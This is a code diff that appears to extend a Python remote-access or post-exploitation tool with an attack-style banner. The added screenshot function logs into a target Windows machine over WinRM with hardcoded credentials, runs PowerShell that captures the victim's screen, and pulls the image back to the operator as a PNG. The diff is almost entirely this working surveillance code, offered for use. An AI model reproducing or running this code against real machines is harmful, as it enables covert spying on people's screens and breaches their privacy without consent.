@@ -3,6 +3,8 @@ import sys
 import socket
 import getpass
 import platform
+import base64
+from datetime import datetime
 
 BANNER = r"""
 :::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: ::::::::::: 
@@ -89,6 +91,44 @@ def check_connection(target_ip, timeout=3):
         finally:
             sock.close()
     return target_ip
+
+def screenshot(target_ip):
+    print("[*] Taking screenshot...")
+
+    session = winrm.Session(
+        target_ip,
+        auth=(USERNAME, PASSWORD),
+        transport='ntlm'
+    )
+
+    ps_script = r'''
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
+    $ms = New-Object System.IO.MemoryStream
+    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+    $bytes = $ms.ToArray()
+    [Convert]::ToBase64String($bytes)
+    '''
+
+    result = session.run_ps(ps_script)
+
+    if result.status_code != 0:
+        print("[-] Screenshot failed")
+        return
+    
+    img_data = base64.b64decode(result.stdout)
+
+    filename = f"screenshot_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+    with open(filename, "wb") as f:
+        f.write(img_data)
+    
+    print(f"[+] Screenshot saved: {filename}")
 
 
 def cli():
